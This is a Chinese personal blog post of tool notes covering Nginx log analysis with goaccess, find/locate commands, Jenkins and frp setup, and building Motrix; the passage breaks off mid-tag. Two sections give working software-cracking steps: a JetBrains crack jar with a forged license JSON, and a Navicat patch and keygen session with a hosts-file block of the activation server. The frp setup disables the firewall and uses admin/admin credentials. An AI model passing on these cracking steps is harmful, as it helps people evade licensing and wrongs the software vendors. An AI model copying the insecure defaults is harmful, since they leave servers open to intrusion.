<p><a href="https://mp.weixin.qq.com/s/6YVC9hA2fMEjclWmseevXA" target="_blank" rel="noopener">看示例学awk</a></p>
<p><a href="https://linux.cn/article-10232-1.html" target="_blank" rel="noopener">Sed 命令完全指南 </a></p>
<p><a href="https://www.centos.bz/2017/07/nginx-awk-access-log/" target="_blank" rel="noopener">awk查看统计Nginx访问日志</a></p>
<p><a href="https://www.centos.bz/2018/11/sed%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">Sed:一些常用的命令详解</a></p>
<p><a href="https://laravel-china.org/articles/21602" target="_blank" rel="noopener">提高工作效率的 VIM 操作</a></p>
<p><a href="https://laravel-china.org/articles/21832" target="_blank" rel="noopener">Git 基本使用文档</a></p>
<p><a href="https://learnku.com/articles/28904" target="_blank" rel="noopener">网络问题连不上网</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/18/有用的网站和工具/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/18/有用的网站和工具/" itemprop="url">有用的网站和工具</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-18T17:07:46+08:00">
                2018-12-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  12.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  55 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Nginx-访问日志分析工具"><a href="#Nginx-访问日志分析工具" class="headerlink" title="Nginx 访问日志分析工具"></a>Nginx 访问日志分析工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://www.dahouduan.com/2018/05/31/nginx-goaccess/ https://www.jianshu.com/p/44d9ffe8cbdb</span></span><br><span class="line">sed -n <span class="string">"/31\/May\/2018:09:00:00/,/31\/May\/2018:11:00:00/"</span>p access.log &gt; access1.log  </span><br><span class="line">以上命令表示将 <span class="number">5.31</span> 日 <span class="number">9</span>点到 <span class="number">11</span> 点的请求日志提取到 access1.log </span><br><span class="line">yum -y install goaccess</span><br><span class="line">[root@VM_0_14_centos ~]# goaccess --dcf</span><br><span class="line">/etc/goaccess.conf</span><br><span class="line">cat /etc/nginx/nginx.conf</span><br><span class="line">goaccess  -f  /usr/local/access.log -o  nginx_log.html</span><br><span class="line">Parsing... [<span class="number">0</span>] [<span class="number">0</span>/s]</span><br><span class="line">GoAccess - version <span class="number">1.2</span> - Jul <span class="number">23</span> <span class="number">2017</span> <span class="number">03</span>:<span class="number">05</span>:<span class="number">48</span></span><br><span class="line">Config file: <span class="regexp">/etc/g</span>oaccess.conf</span><br><span class="line"></span><br><span class="line">Fatal error has occurred</span><br><span class="line"><span class="built_in">Error</span> occured at: src/parser.c - parse_log - <span class="number">2705</span></span><br><span class="line">No time format was found on your conf file.</span><br><span class="line">vi /etc/goaccess.conf</span><br><span class="line">time-format %H:%M:%S</span><br><span class="line">date-format %d/%b/%Y</span><br><span class="line"> log-format %h %^[%d:%t %^] “%r” %s %b “%R” “%u”</span><br><span class="line">goaccess  -f  /usr/local/access.log -o -p /etc/goaccess.conf nginx_log.html</span><br><span class="line">http:<span class="comment">//118.24.158.116:8888/nginx_log.html</span></span><br></pre></td></tr></table></figure>
<h3 id="JetBrains破解"><a href="#JetBrains破解" class="headerlink" title="JetBrains破解"></a>JetBrains破解</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">phpstorm 破解：http:<span class="comment">//idea.zzmcloud.cn http://idea.lanyus.com/</span></span><br><span class="line"><span class="comment">//https://laravel-china.org/articles/21641 https://www.iacblog.com/2018/10/302.html</span></span><br><span class="line">下载破解补丁(jar)https:<span class="comment">//cdn.iacblog.com/jet/JetbrainsCrack-3.1-release-enc.jar 到安装bin目录</span></span><br><span class="line">编辑 phpstorm64.exe.vmoptions</span><br><span class="line">-javaagent:E:\Program Files\JetBrains\PhpStorm <span class="number">2018.2</span><span class="number">.2</span>\bin\JetbrainsCrack<span class="number">-3.1</span>-release-enc.jar</span><br><span class="line"></span><br><span class="line">重启idea--&gt;打开激活窗口，选择激活码方式，填入以下激活码</span><br><span class="line">&#123;<span class="string">"licenseId"</span>:<span class="string">"ThisCrackLicenseId"</span>,</span><br><span class="line"><span class="string">"licenseeName"</span>:<span class="string">"随便填"</span>,</span><br><span class="line"><span class="string">"assigneeName"</span>:<span class="string">"随便填"</span>,</span><br><span class="line"><span class="string">"assigneeEmail"</span>:<span class="string">"邮箱，随便填"</span>,</span><br><span class="line"><span class="string">"licenseRestriction"</span>:<span class="string">"描述信息，随便填"</span>,</span><br><span class="line"><span class="string">"checkConcurrentUse"</span>:<span class="literal">false</span>,</span><br><span class="line"><span class="string">"products"</span>:[</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"II"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"DM"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"AC"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"RS0"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"WS"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"DPN"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"RC"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"PS"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"DC"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"RM"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"CL"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"PC"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"DB"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"GO"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="string">"RD"</span>,<span class="string">"paidUpTo"</span>:<span class="string">"2099-12-31"</span>&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"hash"</span>:<span class="string">"2911276/0"</span>,</span><br><span class="line"><span class="string">"gracePeriodDays"</span>:<span class="number">7</span>,</span><br><span class="line"><span class="string">"autoProlongated"</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="navicat破解"><a href="#navicat破解" class="headerlink" title="navicat破解"></a>navicat破解</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://pan.baidu.com/s/1h1DKOCEkIf8pmPVWeHGcrw</span></span><br><span class="line"><span class="comment">//host 127.0.0.1   activate.navicat.com</span></span><br><span class="line">Patch.exe 生成私钥文件 RegPrivateKey.pem</span><br><span class="line">Keygen.exe 生成注册码</span><br><span class="line">$ /d/Navicat_Premium/Patch.exe <span class="string">"D:\Navicat 12 for MySQL\navicat.exe"</span></span><br><span class="line">D:\Navicat <span class="number">12</span> <span class="keyword">for</span> MySQL\navicat.exe has been backed up.</span><br><span class="line">Public key has been replaced.</span><br><span class="line">Success!.</span><br><span class="line">λ navicat-keygen.exe -text .\RegPrivateKey.pem</span><br><span class="line">Select Navicat product:</span><br><span class="line"><span class="number">0.</span> DataModeler</span><br><span class="line"><span class="number">1.</span> Premium</span><br><span class="line"><span class="number">2.</span> MySQL</span><br><span class="line"><span class="number">3.</span> PostgreSQL</span><br><span class="line"><span class="number">4.</span> Oracle</span><br><span class="line"><span class="number">5.</span> SQLServer</span><br><span class="line"><span class="number">6.</span> SQLite</span><br><span class="line"><span class="number">7.</span> MariaDB</span><br><span class="line"><span class="number">8.</span> MongoDB</span><br><span class="line"><span class="number">9.</span> ReportViewer</span><br><span class="line"></span><br><span class="line">(Input index)&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Select product language:</span><br><span class="line"><span class="number">0.</span> English</span><br><span class="line"><span class="number">1.</span> Simplified Chinese</span><br><span class="line"><span class="number">2.</span> Traditional Chinese</span><br><span class="line"><span class="number">3.</span> Japanese</span><br><span class="line"><span class="number">4.</span> Polish</span><br><span class="line"><span class="number">5.</span> Spanish</span><br><span class="line"><span class="number">6.</span> French</span><br><span class="line"><span class="number">7.</span> German</span><br><span class="line"><span class="number">8.</span> Korean</span><br><span class="line"><span class="number">9.</span> Russian</span><br><span class="line"><span class="number">10.</span> Portuguese</span><br><span class="line"></span><br><span class="line">(Input index)&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">(Input major version number, <span class="attr">range</span>: <span class="number">0</span> ~ <span class="number">15</span>, <span class="attr">default</span>: <span class="number">12</span>)&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">Serial number:</span><br><span class="line">NAVJ-AM3K-FKY5-AAKX</span><br><span class="line"></span><br><span class="line">Your name: susheng</span><br><span class="line">Your organization: susheng</span><br><span class="line"></span><br><span class="line">Input request code (<span class="keyword">in</span> Base64), input empty line to end:</span><br><span class="line">ckZjXUkNdMuyQRr+uVn/FTWKfJHuglwETU7GpVgBaF5c8vWG3JhgbGGXYYerBBD1VGIM9tuCwsMa</span><br><span class="line">MjrOVnyEB037SgSgY3VymZ1K9/mTpE5pVriZ/LyVlyXmH6YMTBMNsy3tzKt6CMdI+L/xetg9j97B</span><br><span class="line">fBRHLbHiabMtPSf8zRyKGrWS9id9jwqAALsu/PkfKsHILz7jGnM8drQqanRPDUfOtKLyhkIoMhM7</span><br><span class="line">d42eeMYhvkK0s0YUMX17uae9ygv5UocYh6bZFI+Zw53Q4ShGLtlbbU60TbGkJKjI/vh3NurVECsg</span><br><span class="line">COa4dnKfGcZJvMfYwXYgHwkQmnFC37iMg7w9JQ==</span><br></pre></td></tr></table></figure>
<h3 id="HTML-转-PDF"><a href="#HTML-转-PDF" class="headerlink" title="HTML 转 PDF"></a>HTML 转 PDF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//wkhtmltopdf.org/ https://github.com/subtlephp/phpwkhtmltox</span></span><br><span class="line">wkhtmltopdf longtable.html longtable<span class="number">-01.</span>pdf</span><br><span class="line"></span><br><span class="line">wkhtmltopdf http:<span class="comment">//www.baidu.com/ D:website1.pdf</span></span><br></pre></td></tr></table></figure>
<h3 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://laravel-china.org/articles/21937</span></span><br><span class="line"></span><br><span class="line">locate是从/<span class="keyword">var</span>/lib/mlocate数据库中进行搜索，find是遍历整个文件夹，所以find比较耗费资源，当然也就比较慢</span><br><span class="line"></span><br><span class="line">locate不能马上搜索到新建的文件，因为/<span class="keyword">var</span>/lib/mlocate数据库是一天一更新</span><br><span class="line"></span><br><span class="line">locate是搜索的是数据库，所以默认根据公共配置文件搜索全部文件</span><br><span class="line">公共配置文件</span><br><span class="line">[root@localhost ~]# cat /etc/updatedb.conf</span><br><span class="line">PRUNE_BIND_MOUNTS = <span class="string">"yes"</span></span><br><span class="line">PRUNEFS = <span class="string">"9p afs anon_inodefs auto autofs bdev binfmt_misc cgroup cifs coda configfs cpuset debugfs devpts ecryptfs exofs fuse fusectl gfs gfs2 hugetlbfs inotifyfs iso9660 jffs2 lustre mqueue ncpfs nfs nfs4 nfsd pipefs proc ramfs rootfs rpc_pipefs securityfs selinuxfs sfs sockfs sysfs tmpfs ubifs udf usbfs"</span></span><br><span class="line">PRUNENAMES = <span class="string">".git .hg .svn"</span></span><br><span class="line">PRUNEPATHS = <span class="string">"/afs /media /net /sfs /tmp /udev /var/cache/ccache /var/spool/cups /var/spool/squid /var/tmp"</span></span><br><span class="line">更新locate数据库updatedb</span><br><span class="line">find /<span class="keyword">var</span>/log -mtime +<span class="number">10</span></span><br><span class="line">find /etc -size +<span class="number">20</span>k -a -size +<span class="number">50</span>k -exec ls -lh &#123;&#125; \;</span><br><span class="line">find /root -name <span class="string">"cangls*"</span> -exec rm -rf &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find . size <span class="number">25</span>k</span><br><span class="line">man 5 passwd # 查看passwd的配置帮助</span><br><span class="line">man 4 null # 查看null特殊文件的帮助，null相当于黑洞</span><br><span class="line">man 8 ifconfig # 查看ip配置帮助</span><br><span class="line">zip 压缩文件名 源文件</span><br><span class="line">zip -r 压缩文件名 源目录</span><br><span class="line">unzip 压缩文件</span><br><span class="line">tar -cvf longzls.tar longzls</span><br><span class="line">tar -zcvf 压缩包名.tar.gz 源文件</span><br><span class="line">tar -zxvf 压缩包名.tar.gz</span><br><span class="line">last命令默认是读取/<span class="keyword">var</span>/log/wtmp文件数据</span><br><span class="line"></span><br><span class="line">/<span class="keyword">var</span>/log/wtmp是二进制文件，不能直接编辑，只能通过last读取，防止黑客篡改</span><br><span class="line"></span><br><span class="line">还能看到重启信息</span><br><span class="line">lastlog命令默认是读取/<span class="keyword">var</span>/log/lastlog文件内容</span><br><span class="line"></span><br><span class="line">/<span class="keyword">var</span>/log/lastlog也是二进制文件</span><br></pre></td></tr></table></figure>
<h3 id="全能的下载工具"><a href="#全能的下载工具" class="headerlink" title="全能的下载工具"></a>全能的下载工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:agalwood/Motrix.git</span><br><span class="line">cd Motrix</span><br><span class="line">npm install</span><br><span class="line">npm config set registry <span class="string">'https://registry.npm.taobao.org'</span></span><br><span class="line"><span class="keyword">export</span> ELECTRON_MIRROR=<span class="string">'https://npm.taobao.org/mirrors/electron/'</span></span><br><span class="line"><span class="keyword">export</span> SASS_BINARY_SITE=<span class="string">'https://npm.taobao.org/mirrors/node-sass'</span></span><br><span class="line">npm run dev</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure>
<h3 id="自动登录ssh脚本"><a href="#自动登录ssh脚本" class="headerlink" title="自动登录ssh脚本"></a>自动登录ssh脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum instal -y expect</span><br><span class="line">vi ~<span class="regexp">/.bashrc</span></span><br><span class="line"><span class="regexp"># 最后一行加入</span></span><br><span class="line"><span class="regexp">alias assh='/</span>此项目绝对路径/assh.sh<span class="string">'</span></span><br><span class="line"><span class="string"># 示例</span></span><br><span class="line"><span class="string"># alias assh='</span>/<span class="keyword">var</span>/www/assh/assh.sh<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 即时生效https://laravel-china.org/articles/22589</span></span><br><span class="line"><span class="string">source ~/.bashrc</span></span><br></pre></td></tr></table></figure>
<h3 id="jenkins"><a href="#jenkins" class="headerlink" title="jenkins"></a>jenkins</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">下载 jenkins</span><br><span class="line"></span><br><span class="line">$ mkdir /usr/local/jenkins</span><br><span class="line">$ cd /usr/local/jenkins</span><br><span class="line">$ wget -c http:<span class="comment">//mirrors.jenkins.io/war-stable/latest/jenkins.war</span></span><br><span class="line">配置环境变量</span><br><span class="line"></span><br><span class="line">设置 jenkins 的主目录</span><br><span class="line"></span><br><span class="line">## root 用户配置 /etc/profile</span><br><span class="line"># vi /etc/profile</span><br><span class="line"><span class="keyword">export</span> JENKINS_ROOT=<span class="regexp">/usr/</span>local/jenkins</span><br><span class="line"><span class="keyword">export</span> JENKINS_HOME=$JENKINS_ROOT/jenkins_home</span><br><span class="line"># source /etc/profile</span><br><span class="line"></span><br><span class="line">## 非 root 用户，配置 .bashrc</span><br><span class="line">$ vi ~<span class="regexp">/.bashrc</span></span><br><span class="line"><span class="regexp">export JENKINS_ROOT=/u</span>sr/local/jenkins</span><br><span class="line"><span class="keyword">export</span> JENKINS_HOME=$JENKINS_ROOT/jenkins_home</span><br><span class="line">$ source ~<span class="regexp">/.bashrc</span></span><br><span class="line"><span class="regexp">$ nohup java -jar /u</span>sr/local/jenkins/jenkins.war --httpPort=<span class="number">8080</span> &gt;&gt; <span class="regexp">/usr/</span>local/jenkins/jenkins.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br><span class="line">[root@VM_0_14_centos jenkins]# cat /usr/local/jenkins/jenkins.log</span><br><span class="line">nohup: ignoring input</span><br><span class="line">Jan <span class="number">29</span>, <span class="number">2019</span> <span class="number">10</span>:<span class="number">01</span>:<span class="number">15</span> AM Main main</span><br><span class="line">SEVERE: Running with Java class version 55.0, but 52.0 is required.Run with the --enable-future-java flag to enable such behavior. See https://jenkins.io/redirect/java-support/</span><br><span class="line">java.lang.UnsupportedClassVersionError: <span class="number">55.0</span></span><br><span class="line">        at Main.main(Main.java:<span class="number">139</span>)</span><br><span class="line"></span><br><span class="line">Jenkins requires Java <span class="number">8</span>, but you are running <span class="number">11.0</span><span class="number">.2</span>+<span class="number">7</span>-LTS <span class="keyword">from</span> /usr/java/jdk<span class="number">-11.0</span><span class="number">.2</span></span><br><span class="line">java.lang.UnsupportedClassVersionError: <span class="number">55.0</span></span><br><span class="line">        at Main.main(Main.java:<span class="number">139</span>)</span><br><span class="line">        </span><br><span class="line">下载 WAR <span class="number">2.127</span>+, 加 --enable-future-java 选项，即 nohup java -jar /usr/local/jenkins/jenkins.war --enable-future-java --httpPort=<span class="number">8080</span> &gt;&gt; <span class="regexp">/usr/</span>local/jenkins/jenkins.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br><span class="line">访问http:<span class="comment">//118.24.158.116:8180 </span></span><br><span class="line"></span><br><span class="line">[root@VM_0_14_centos ~]# cat /usr/local/jenkins/jenkins_home/secrets/initialAdminPassword</span><br><span class="line"><span class="number">8</span>db94e0d2ea04e21ac643d47eee9699c</span><br><span class="line">Unlock Jenkins 页面输入密码   https:<span class="comment">//github.com/codcodog/Blog/issues/106</span></span><br><span class="line">Customize Jenkins     </span><br><span class="line">jenkins 重启</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//localhost:8080/restart</span></span><br><span class="line">jenkins 重载 - 重新加载配置信息</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//localhost:8080/reload</span></span><br><span class="line">jenkins 退出</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//localhost:8080/exit</span></span><br></pre></td></tr></table></figure>
<h3 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">wget -c https:<span class="comment">//github.com/fatedier/frp/releases/download/v0.23.1/frp_0.23.1_linux_amd64.tar.gz</span></span><br><span class="line">tar zxvf frp*.tar.gz </span><br><span class="line">cd /root/frp</span><br><span class="line">chmod +x frps</span><br><span class="line">yum install -y supervisor</span><br><span class="line">systemctl disable firewalld &amp;&amp; systemctl stop firewalld</span><br><span class="line"></span><br><span class="line"># 定义 frps 配置</span><br><span class="line">cat &gt; <span class="regexp">/root/</span>frp/frps.ini &lt;&lt;EOF</span><br><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">30000</span></span><br><span class="line">vhost_http_port = <span class="number">30100</span></span><br><span class="line">vhost_https_port = <span class="number">30143</span></span><br><span class="line">subdomain_host = dev.demo.cc</span><br><span class="line">dashboard_port = <span class="number">30200</span></span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = admin</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"># 定义运行守护配置</span><br><span class="line">cat &gt; <span class="regexp">/etc/</span>supervisord.d/frps.ini &lt;&lt;EOF</span><br><span class="line">[program:frps]</span><br><span class="line">directory=<span class="regexp">/root/</span>frp</span><br><span class="line">command=<span class="regexp">/root/</span>frp/frps -c /root/frp/frps.ini</span><br><span class="line">autostart=<span class="literal">true</span></span><br><span class="line">autorestart=<span class="literal">false</span></span><br><span class="line">stderr_logfile=<span class="regexp">/var/</span>log/supervisor/frps_stderr.log</span><br><span class="line">stdout_logfile=<span class="regexp">/var/</span>log/supervisor/frps_stdout.log</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"># 开启服务</span><br><span class="line">systemctl enable supervisord &amp;&amp; systemctl start supervisord</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/16985</span></span><br></pre></td></tr></table></figure>
<h3 id="查询命令函数"><a href="#查询命令函数" class="headerlink" title="查询命令函数"></a>查询命令函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> curl cht.sh/php/array_map</span><br><span class="line">&lt;?</span><br><span class="line"><span 